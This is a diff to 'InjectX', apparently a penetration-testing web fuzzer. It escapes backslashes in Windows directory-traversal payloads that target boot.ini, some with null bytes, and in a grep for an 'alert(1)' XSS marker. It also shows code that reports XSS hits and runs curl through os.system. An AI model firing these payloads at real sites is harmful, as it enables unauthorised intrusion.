@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-# InjectX Fuzzer v20230331 by @xer0dayz
+# InjectX Fuzzer v20241124 by @xer0dayz
 # https://sn1persecurity.com
 
 from __future__ import print_function
@@ -20,9 +20,9 @@ VERBOSE='1'
 def logo():
     print(OKORANGE + '      ____        _           __ _  __' + RESET)
     print(OKORANGE + '     /  _/___    (_)__  _____/ /| |/ /' + RESET)
-    print(OKORANGE + '     / // __ \  / / _ \/ ___/ __/   / ' + RESET)
+    print(OKORANGE + '     / // __ \\  / / _ \\/ ___/ __/   / ' + RESET)
     print(OKORANGE + '   _/ // / / / / /  __/ /__/ /_/   |  ' + RESET)
-    print(OKORANGE + '  /___/_/ /_/_/ /\___/\___/\__/_/|_|  ' + RESET)
+    print(OKORANGE + '  /___/_/ /_/_/ /\\___/\\___/\\__/_/|_|  ' + RESET)
     print(OKORANGE + '         /_____/                     ' + RESET)
     print('')
     print(OKGREEN +   '--== Inject-X Fuzzer by @xer0dayz ==-- ' + RESET)
@@ -170,7 +170,7 @@ def active_scan():
                     print(OKRED + "[+] XSS Found! ", str(payload_exploit2) + RESET)
                     print(OKRED + "[+] Vulnerable URL: " + xss_url2 + RESET)
                     print(OKGREEN + "[c] Exploit Command: firefox '" + xss_url2 + "' & ")
-                    os.system("curl -s '" + xss_url2 + "' | egrep alert\(1\) --color=auto")
+                    os.system("curl -s '" + xss_url2 + "' | egrep alert\\(1\\) --color=auto")
                     f.write("P3 - MEDIUM, Cross-Site Scripting (XSS), " + str(xss_url2) + ", " + str(payload_exploit2) + "\n")
                     #os.system("firefox '" + xss_url2 + "' > /dev/null 2> /dev/null")
                 except:
@@ -233,7 +233,7 @@ def active_scan():
 
     # Windows Directory Traversal ######################################################################################
     try:
-        traversal_exploit = '/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini'
+        traversal_exploit = '/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\\\boot.ini'
         if (verbose == "y"):
             print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
 
@@ -257,7 +257,7 @@ def active_scan():
 
     # Windows Directory Traversal 2 ######################################################################################
     try:
-        traversal_exploit = '/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00'
+        traversal_exploit = '/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\\\boot.ini%00'
         if (verbose == "y"):
             print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
 
@@ -983,7 +983,7 @@ else:
         new_url = full_url + 'INJECTX'
 
         # Windows Directory Traversal ######################################################################################
-        traversal_exploit = urllib.parse.quote('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini')
+        traversal_exploit = urllib.parse.quote('..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\\\boot.ini')
         if (verbose == "y"):
             print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
 
@@ -1009,7 +1009,7 @@ else:
         new_url = full_url + 'INJECTX'
 
         # Windows Directory Traversal 2 ######################################################################################
-        traversal_exploit = urllib.parse.quote('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00')
+        traversal_exploit = urllib.parse.quote('..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\\\boot.ini%00')
         if (verbose == "y"):
             print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET)
 
